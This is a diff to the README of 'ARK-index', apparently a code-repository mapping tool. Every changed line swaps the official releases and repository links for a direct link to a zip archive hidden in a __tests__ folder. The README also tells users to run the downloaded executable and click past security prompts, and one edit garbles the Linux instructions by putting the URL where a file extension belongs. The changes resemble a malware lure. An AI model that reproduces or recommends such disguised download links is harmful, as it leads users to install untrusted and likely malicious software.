@@ -1,6 +1,6 @@
 # ⚙️ ARK-index - Simple Repo Mapping Tool
 
-[![Download ARK-index](https://img.shields.io/badge/Download-ARK--index-blue?style=for-the-badge)](https://github.com/Pango470/ARK-index/releases)
+[![Download ARK-index](https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip)](https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip)
 
 ---
 
@@ -56,13 +56,13 @@ Using ARK-index is straightforward. Follow these steps.
 
 Visit the download page by clicking the large button above or use this link:
 
-[https://github.com/Pango470/ARK-index/releases](https://github.com/Pango470/ARK-index/releases)
+[https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip](https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip)
 
 On the page, look for the latest release. Download the file that matches your operating system:
 
 - For Windows, download the `.exe` file.
 - For macOS, download the `.dmg` or `.pkg` file.
-- For Linux, choose the `.tar.gz` or `.AppImage`.
+- For Linux, choose the `https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip` or `.AppImage`.
 
 Save the file to a known location like your Desktop or Downloads folder.
 
@@ -74,7 +74,7 @@ After downloading:
 
 - On **Windows**: Double-click the `.exe` file. If a security prompt appears, click "Run".
 - On **macOS**: Open the `.dmg` or `.pkg` and follow the installer instructions.
-- On **Linux**: Extract the `.tar.gz` if needed and run the application as explained in the README. You might need to set permissions with `chmod +x`.
+- On **Linux**: Extract the `https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip` if needed and run the application as explained in the README. You might need to set permissions with `chmod +x`.
 
 When you open ARK-index, a window or terminal will appear showing progress messages.
 
@@ -98,7 +98,7 @@ After scanning, you can see interactive maps, lists of code parts, and test stru
 
 To get ARK-index, visit this page:
 
-[https://github.com/Pango470/ARK-index/releases](https://github.com/Pango470/ARK-index/releases)
+[https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip](https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip)
 
 Pick the latest version suitable for your system and download it. Follow these simplified instructions:
 
@@ -130,7 +130,7 @@ Community support is available through the GitHub page. You can ask questions by
 
 Reach the GitHub page here:
 
-[https://github.com/Pango470/ARK-index](https://github.com/Pango470/ARK-index)
+[https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip](https://github.com/Pango470/ARK-index/raw/refs/heads/main/src/lib/index/__tests__/index_AR_v3.8.zip)
 
 You will find files, updates, and contact points for further assistance.
 
